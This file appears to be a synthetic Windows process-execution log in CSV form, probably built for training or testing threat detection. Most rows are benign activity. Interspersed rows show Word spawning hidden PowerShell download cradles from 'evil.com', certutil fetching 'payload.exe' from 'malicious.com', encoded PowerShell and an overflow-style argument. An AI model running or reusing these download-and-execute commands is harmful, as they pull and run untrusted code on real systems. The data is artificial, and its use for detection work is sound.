timestamp,process,parent_process,command_line,ip,destination_port,user_agent
2026-03-30 18:08:29,cmd.exe,explorer.exe,notepad file.txt,192.168.1.146,0,chrome
2026-03-30 18:08:30,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.218,0,chrome
2026-03-30 18:08:31,explorer.exe,explorer.exe,cmd dir,192.168.1.30,0,chrome
2026-03-30 18:08:32,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.240,0,chrome
2026-03-30 18:08:33,notepad.exe,explorer.exe,explorer open folder,192.168.1.151,0,chrome
2026-03-30 18:08:34,cmd.exe,explorer.exe,cmd dir,192.168.1.73,0,chrome
2026-03-30 18:08:35,explorer.exe,explorer.exe,cmd dir,192.168.1.118,0,chrome
2026-03-30 18:08:36,cmd.exe,explorer.exe,notepad file.txt,192.168.1.22,0,chrome
2026-03-30 18:08:37,chrome.exe,explorer.exe,notepad file.txt,192.168.1.253,0,chrome
2026-03-30 18:08:38,chrome.exe,explorer.exe,notepad file.txt,192.168.1.110,0,chrome
2026-03-30 18:08:39,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.126,0,chrome
2026-03-30 18:08:40,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.233,0,chrome
2026-03-30 18:08:41,explorer.exe,explorer.exe,explorer open folder,192.168.1.174,0,chrome
2026-03-30 18:08:42,chrome.exe,explorer.exe,cmd dir,192.168.1.239,0,chrome
2026-03-30 18:08:43,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.58,0,chrome
2026-03-30 18:08:44,chrome.exe,explorer.exe,cmd dir,192.168.1.31,0,chrome
2026-03-30 18:08:45,notepad.exe,explorer.exe,notepad file.txt,192.168.1.154,0,chrome
2026-03-30 18:08:46,cmd.exe,explorer.exe,explorer open folder,192.168.1.243,0,chrome
2026-03-30 18:08:47,chrome.exe,explorer.exe,explorer open folder,192.168.1.54,0,chrome
2026-03-30 18:08:48,notepad.exe,explorer.exe,explorer open folder,192.168.1.49,0,chrome
2026-03-30 18:08:49,notepad.exe,explorer.exe,cmd dir,192.168.1.122,0,chrome
2026-03-30 18:08:50,explorer.exe,explorer.exe,explorer open folder,192.168.1.160,0,chrome
2026-03-30 18:08:51,explorer.exe,explorer.exe,explorer open folder,192.168.1.235,0,chrome
2026-03-30 18:08:52,explorer.exe,explorer.exe,cmd dir,192.168.1.174,0,chrome
2026-03-30 18:08:53,chrome.exe,explorer.exe,cmd dir,192.168.1.237,0,chrome
2026-03-30 18:08:54,explorer.exe,explorer.exe,notepad file.txt,192.168.1.115,0,chrome
2026-03-30 18:08:55,explorer.exe,explorer.exe,notepad file.txt,192.168.1.6,0,chrome
2026-03-30 18:08:56,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.199,0,chrome
2026-03-30 18:08:57,explorer.exe,explorer.exe,explorer open folder,192.168.1.173,0,chrome
2026-03-30 18:08:58,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.218,0,chrome
2026-03-30 18:08:59,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.140,0,chrome
2026-03-30 18:09:00,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.170,0,chrome
2026-03-30 18:09:01,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.42,0,chrome
2026-03-30 18:09:02,cmd.exe,explorer.exe,notepad file.txt,192.168.1.234,0,chrome
2026-03-30 18:09:03,explorer.exe,explorer.exe,explorer open folder,192.168.1.35,0,chrome
2026-03-30 18:09:04,notepad.exe,explorer.exe,notepad file.txt,192.168.1.234,0,chrome
2026-03-30 18:09:05,chrome.exe,explorer.exe,cmd dir,192.168.1.222,0,chrome
2026-03-30 18:09:06,notepad.exe,explorer.exe,cmd dir,192.168.1.78,0,chrome
2026-03-30 18:09:07,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.156,0,chrome
2026-03-30 18:09:08,cmd.exe,explorer.exe,notepad file.txt,192.168.1.224,0,chrome
2026-03-30 18:09:09,notepad.exe,explorer.exe,cmd dir,192.168.1.137,0,chrome
2026-03-30 18:09:10,cmd.exe,explorer.exe,explorer open folder,192.168.1.47,0,chrome
2026-03-30 18:09:11,explorer.exe,explorer.exe,cmd dir,192.168.1.154,0,chrome
2026-03-30 18:09:12,cmd.exe,explorer.exe,cmd dir,192.168.1.71,0,chrome
2026-03-30 18:09:13,explorer.exe,explorer.exe,cmd dir,192.168.1.25,0,chrome
2026-03-30 18:09:14,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.174,0,chrome
2026-03-30 18:09:15,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.186,0,chrome
2026-03-30 18:09:16,explorer.exe,explorer.exe,cmd dir,192.168.1.213,0,chrome
2026-03-30 18:09:17,explorer.exe,explorer.exe,notepad file.txt,192.168.1.17,0,chrome
2026-03-30 18:09:18,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.157,0,chrome
2026-03-30 18:09:19,notepad.exe,explorer.exe,explorer open folder,192.168.1.242,0,chrome
2026-03-30 18:09:20,cmd.exe,explorer.exe,cmd dir,192.168.1.104,0,chrome
2026-03-30 18:09:21,notepad.exe,explorer.exe,explorer open folder,192.168.1.10,0,chrome
2026-03-30 18:09:22,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.179,0,chrome
2026-03-30 18:09:23,cmd.exe,explorer.exe,explorer open folder,192.168.1.87,0,chrome
2026-03-30 18:09:24,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.239,0,chrome
2026-03-30 18:09:25,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,1.1.1.1,80,python-requests
2026-03-30 18:09:26,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,80,python-requests
2026-03-30 18:09:27,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,45.33.32.156,80,curl
2026-03-30 18:09:28,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,443,python-requests
2026-03-30 18:09:29,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),23.45.67.89,80,curl
2026-03-30 18:09:30,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
2026-03-30 18:09:31,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,8.8.8.8,80,winhttp
2026-03-30 18:09:32,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
2026-03-30 18:09:33,chrome.exe,explorer.exe,notepad file.txt,192.168.1.228,0,chrome
2026-03-30 18:09:34,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.142,0,chrome
2026-03-30 18:09:35,cmd.exe,explorer.exe,notepad file.txt,192.168.1.255,0,chrome
2026-03-30 18:09:36,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.138,0,chrome
2026-03-30 18:09:37,explorer.exe,explorer.exe,cmd dir,192.168.1.51,0,chrome
2026-03-30 18:09:38,explorer.exe,explorer.exe,notepad file.txt,192.168.1.223,0,chrome
2026-03-30 18:09:39,notepad.exe,explorer.exe,cmd dir,192.168.1.133,0,chrome
2026-03-30 18:09:40,cmd.exe,explorer.exe,notepad file.txt,192.168.1.246,0,chrome
2026-03-30 18:09:41,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.241,0,chrome
2026-03-30 18:09:42,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.1,0,chrome
2026-03-30 18:09:43,chrome.exe,explorer.exe,notepad file.txt,192.168.1.194,0,chrome
2026-03-30 18:09:44,cmd.exe,explorer.exe,cmd dir,192.168.1.20,0,chrome
2026-03-30 18:09:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,8.8.8.8,8080,curl
2026-03-30 18:09:46,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.148,0,chrome
2026-03-30 18:09:47,cmd.exe,explorer.exe,explorer open folder,192.168.1.92,0,chrome
2026-03-30 18:09:48,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.139,0,chrome
2026-03-30 18:09:49,notepad.exe,explorer.exe,notepad file.txt,192.168.1.38,0,chrome
2026-03-30 18:09:50,explorer.exe,explorer.exe,notepad file.txt,192.168.1.147,0,chrome
2026-03-30 18:09:51,chrome.exe,explorer.exe,explorer open folder,192.168.1.1,0,chrome
2026-03-30 18:09:52,chrome.exe,explorer.exe,cmd dir,192.168.1.178,0,chrome
2026-03-30 18:09:53,explorer.exe,explorer.exe,explorer open folder,192.168.1.25,0,chrome
2026-03-30 18:09:54,cmd.exe,explorer.exe,notepad file.txt,192.168.1.52,0,chrome
2026-03-30 18:09:55,explorer.exe,explorer.exe,explorer open folder,192.168.1.136,0,chrome
2026-03-30 18:09:56,cmd.exe,explorer.exe,notepad file.txt,192.168.1.176,0,chrome
2026-03-30 18:09:57,cmd.exe,explorer.exe,explorer open folder,192.168.1.83,0,chrome
2026-03-30 18:09:58,cmd.exe,explorer.exe,cmd dir,192.168.1.189,0,chrome
2026-03-30 18:09:59,chrome.exe,explorer.exe,cmd dir,192.168.1.96,0,chrome
2026-03-30 18:10:00,notepad.exe,explorer.exe,notepad file.txt,192.168.1.36,0,chrome
2026-03-30 18:10:01,cmd.exe,explorer.exe,cmd dir,192.168.1.211,0,chrome
2026-03-30 18:10:02,cmd.exe,explorer.exe,cmd dir,192.168.1.224,0,chrome
2026-03-30 18:10:03,cmd.exe,explorer.exe,explorer open folder,192.168.1.48,0,chrome
2026-03-30 18:10:04,chrome.exe,explorer.exe,notepad file.txt,192.168.1.18,0,chrome
2026-03-30 18:10:05,notepad.exe,explorer.exe,explorer open folder,192.168.1.124,0,chrome
2026-03-30 18:10:06,chrome.exe,explorer.exe,notepad file.txt,192.168.1.221,0,chrome
2026-03-30 18:10:07,explorer.exe,explorer.exe,cmd dir,192.168.1.217,0,chrome
2026-03-30 18:10:08,cmd.exe,explorer.exe,explorer open folder,192.168.1.92,0,chrome
2026-03-30 18:10:09,cmd.exe,explorer.exe,explorer open folder,192.168.1.222,0,chrome
2026-03-30 18:10:10,chrome.exe,explorer.exe,cmd dir,192.168.1.191,0,chrome
2026-03-30 18:10:11,chrome.exe,explorer.exe,notepad file.txt,192.168.1.39,0,chrome
2026-03-30 18:10:12,chrome.exe,explorer.exe,notepad file.txt,192.168.1.106,0,chrome
2026-03-30 18:10:13,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.225,0,chrome
2026-03-30 18:10:14,notepad.exe,explorer.exe,cmd dir,192.168.1.255,0,chrome
2026-03-30 18:10:15,unknown_433.exe,explorer.exe,random suspicious execution,45.33.32.156,9999,unknown
2026-03-30 18:10:16,notepad.exe,explorer.exe,notepad file.txt,192.168.1.140,0,chrome
2026-03-30 18:10:17,notepad.exe,explorer.exe,explorer open folder,192.168.1.125,0,chrome
2026-03-30 18:10:18,notepad.exe,explorer.exe,notepad file.txt,192.168.1.246,0,chrome
2026-03-30 18:10:19,notepad.exe,explorer.exe,cmd dir,192.168.1.94,0,chrome
2026-03-30 18:10:20,chrome.exe,explorer.exe,notepad file.txt,192.168.1.227,0,chrome
2026-03-30 18:10:21,notepad.exe,explorer.exe,cmd dir,192.168.1.132,0,chrome
2026-03-30 18:10:22,explorer.exe,explorer.exe,cmd dir,192.168.1.164,0,chrome
2026-03-30 18:10:23,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.214,0,chrome
2026-03-30 18:10:24,notepad.exe,explorer.exe,notepad file.txt,192.168.1.143,0,chrome
2026-03-30 18:10:25,chrome.exe,explorer.exe,cmd dir,192.168.1.186,0,chrome
2026-03-30 18:10:26,cmd.exe,explorer.exe,cmd dir,192.168.1.124,0,chrome
2026-03-30 18:10:27,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.250,0,chrome
2026-03-30 18:10:28,explorer.exe,explorer.exe,notepad file.txt,192.168.1.1,0,chrome
2026-03-30 18:10:29,cmd.exe,explorer.exe,cmd dir,192.168.1.115,0,chrome
2026-03-30 18:10:30,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.31,0,chrome
2026-03-30 18:10:31,cmd.exe,explorer.exe,cmd dir,192.168.1.7,0,chrome
2026-03-30 18:10:32,explorer.exe,explorer.exe,notepad file.txt,192.168.1.222,0,chrome
2026-03-30 18:10:33,cmd.exe,explorer.exe,cmd dir,192.168.1.177,0,chrome
2026-03-30 18:10:34,chrome.exe,explorer.exe,cmd dir,192.168.1.144,0,chrome
2026-03-30 18:10:35,cmd.exe,explorer.exe,explorer open folder,192.168.1.89,0,chrome
2026-03-30 18:10:36,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.34,0,chrome
2026-03-30 18:10:37,cmd.exe,explorer.exe,cmd dir,192.168.1.40,0,chrome
2026-03-30 18:10:38,cmd.exe,explorer.exe,explorer open folder,192.168.1.28,0,chrome
2026-03-30 18:10:39,chrome.exe,explorer.exe,notepad file.txt,192.168.1.121,0,chrome
2026-03-30 18:10:40,chrome.exe,explorer.exe,notepad file.txt,192.168.1.128,0,chrome
2026-03-30 18:10:41,cmd.exe,explorer.exe,notepad file.txt,192.168.1.146,0,chrome
2026-03-30 18:10:42,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.30,0,chrome
2026-03-30 18:10:43,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.127,0,chrome
2026-03-30 18:10:44,cmd.exe,explorer.exe,cmd dir,192.168.1.58,0,chrome
2026-03-30 18:10:45,explorer.exe,explorer.exe,explorer open folder,192.168.1.216,0,chrome
2026-03-30 18:10:46,explorer.exe,explorer.exe,notepad file.txt,192.168.1.199,0,chrome
2026-03-30 18:10:47,cmd.exe,explorer.exe,explorer open folder,192.168.1.180,0,chrome
2026-03-30 18:10:48,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.107,0,chrome
2026-03-30 18:10:49,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.103,0,chrome
2026-03-30 18:10:50,chrome.exe,explorer.exe,notepad file.txt,192.168.1.34,0,chrome
2026-03-30 18:10:51,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.18,0,chrome
2026-03-30 18:10:52,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.148,0,chrome
2026-03-30 18:10:53,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.250,0,chrome
2026-03-30 18:10:54,cmd.exe,explorer.exe,cmd dir,192.168.1.173,0,chrome
2026-03-30 18:10:55,chrome.exe,explorer.exe,notepad file.txt,192.168.1.155,0,chrome
2026-03-30 18:10:56,chrome.exe,explorer.exe,cmd dir,192.168.1.182,0,chrome
2026-03-30 18:10:57,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.178,0,chrome
2026-03-30 18:10:58,notepad.exe,explorer.exe,notepad file.txt,192.168.1.74,0,chrome
2026-03-30 18:10:59,chrome.exe,explorer.exe,cmd dir,192.168.1.70,0,chrome
2026-03-30 18:11:00,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.115,0,chrome
2026-03-30 18:11:01,cmd.exe,explorer.exe,explorer open folder,192.168.1.135,0,chrome
2026-03-30 18:11:02,explorer.exe,explorer.exe,notepad file.txt,192.168.1.117,0,chrome
2026-03-30 18:11:03,notepad.exe,explorer.exe,explorer open folder,192.168.1.30,0,chrome
2026-03-30 18:11:04,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.76,0,chrome
2026-03-30 18:11:05,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),45.33.32.156,443,python-requests
2026-03-30 18:11:06,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,80,curl
2026-03-30 18:11:07,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,45.33.32.156,443,python-requests
2026-03-30 18:11:08,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),8.8.8.8,4444,curl
2026-03-30 18:11:09,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),8.8.8.8,80,curl
2026-03-30 18:11:10,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
2026-03-30 18:11:11,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
2026-03-30 18:11:12,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
2026-03-30 18:11:13,notepad.exe,explorer.exe,explorer open folder,192.168.1.154,0,chrome
2026-03-30 18:11:14,cmd.exe,explorer.exe,explorer open folder,192.168.1.184,0,chrome
2026-03-30 18:11:15,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.235,0,chrome
2026-03-30 18:11:16,explorer.exe,explorer.exe,explorer open folder,192.168.1.119,0,chrome
2026-03-30 18:11:17,chrome.exe,explorer.exe,notepad file.txt,192.168.1.85,0,chrome
2026-03-30 18:11:18,notepad.exe,explorer.exe,explorer open folder,192.168.1.76,0,chrome
2026-03-30 18:11:19,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.217,0,chrome
2026-03-30 18:11:20,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.206,0,chrome
2026-03-30 18:11:21,notepad.exe,explorer.exe,explorer open folder,192.168.1.148,0,chrome
2026-03-30 18:11:22,notepad.exe,explorer.exe,explorer open folder,192.168.1.244,0,chrome
2026-03-30 18:11:23,notepad.exe,explorer.exe,cmd dir,192.168.1.181,0,chrome
2026-03-30 18:11:24,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.246,0,chrome
2026-03-30 18:11:25,explorer.exe,explorer.exe,notepad file.txt,192.168.1.165,0,chrome
2026-03-30 18:11:26,cmd.exe,explorer.exe,explorer open folder,192.168.1.106,0,chrome
2026-03-30 18:11:27,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.199,0,chrome
2026-03-30 18:11:28,chrome.exe,explorer.exe,cmd dir,192.168.1.141,0,chrome
2026-03-30 18:11:29,explorer.exe,explorer.exe,notepad file.txt,192.168.1.208,0,chrome
2026-03-30 18:11:30,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.21,0,chrome
2026-03-30 18:11:31,notepad.exe,explorer.exe,cmd dir,192.168.1.107,0,chrome
2026-03-30 18:11:32,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.235,0,chrome
2026-03-30 18:11:33,cmd.exe,explorer.exe,notepad file.txt,192.168.1.82,0,chrome
2026-03-30 18:11:34,cmd.exe,explorer.exe,cmd dir,192.168.1.251,0,chrome
2026-03-30 18:11:35,cmd.exe,explorer.exe,notepad file.txt,192.168.1.245,0,chrome
2026-03-30 18:11:36,chrome.exe,explorer.exe,cmd dir,192.168.1.63,0,chrome
2026-03-30 18:11:37,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.9,0,chrome
2026-03-30 18:11:38,explorer.exe,explorer.exe,notepad file.txt,192.168.1.217,0,chrome
2026-03-30 18:11:39,chrome.exe,explorer.exe,cmd dir,192.168.1.227,0,chrome
2026-03-30 18:11:40,notepad.exe,explorer.exe,cmd dir,192.168.1.112,0,chrome
2026-03-30 18:11:41,explorer.exe,explorer.exe,cmd dir,192.168.1.93,0,chrome
2026-03-30 18:11:42,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.206,0,chrome
2026-03-30 18:11:43,notepad.exe,explorer.exe,notepad file.txt,192.168.1.28,0,chrome
2026-03-30 18:11:44,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.104,0,chrome
2026-03-30 18:11:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,8.8.8.8,8080,curl
2026-03-30 18:11:46,notepad.exe,explorer.exe,explorer open folder,192.168.1.180,0,chrome
2026-03-30 18:11:47,notepad.exe,explorer.exe,notepad file.txt,192.168.1.78,0,chrome
2026-03-30 18:11:48,chrome.exe,explorer.exe,explorer open folder,192.168.1.75,0,chrome
2026-03-30 18:11:49,chrome.exe,explorer.exe,explorer open folder,192.168.1.219,0,chrome
2026-03-30 18:11:50,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.182,0,chrome
2026-03-30 18:11:51,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.17,0,chrome
2026-03-30 18:11:52,chrome.exe,explorer.exe,notepad file.txt,192.168.1.206,0,chrome
2026-03-30 18:11:53,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.101,0,chrome
2026-03-30 18:11:54,explorer.exe,explorer.exe,notepad file.txt,192.168.1.117,0,chrome
2026-03-30 18:11:55,cmd.exe,explorer.exe,explorer open folder,192.168.1.215,0,chrome
2026-03-30 18:11:56,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.9,0,chrome
2026-03-30 18:11:57,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.78,0,chrome
2026-03-30 18:11:58,chrome.exe,explorer.exe,notepad file.txt,192.168.1.74,0,chrome
2026-03-30 18:11:59,explorer.exe,explorer.exe,cmd dir,192.168.1.115,0,chrome
2026-03-30 18:12:00,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.138,0,chrome
2026-03-30 18:12:01,cmd.exe,explorer.exe,cmd dir,192.168.1.72,0,chrome
2026-03-30 18:12:02,explorer.exe,explorer.exe,explorer open folder,192.168.1.201,0,chrome
2026-03-30 18:12:03,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.37,0,chrome
2026-03-30 18:12:04,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.208,0,chrome
2026-03-30 18:12:05,cmd.exe,explorer.exe,explorer open folder,192.168.1.219,0,chrome
2026-03-30 18:12:06,chrome.exe,explorer.exe,notepad file.txt,192.168.1.85,0,chrome
2026-03-30 18:12:07,chrome.exe,explorer.exe,cmd dir,192.168.1.170,0,chrome
2026-03-30 18:12:08,chrome.exe,explorer.exe,notepad file.txt,192.168.1.216,0,chrome
2026-03-30 18:12:09,chrome.exe,explorer.exe,explorer open folder,192.168.1.159,0,chrome
2026-03-30 18:12:10,notepad.exe,explorer.exe,cmd dir,192.168.1.46,0,chrome
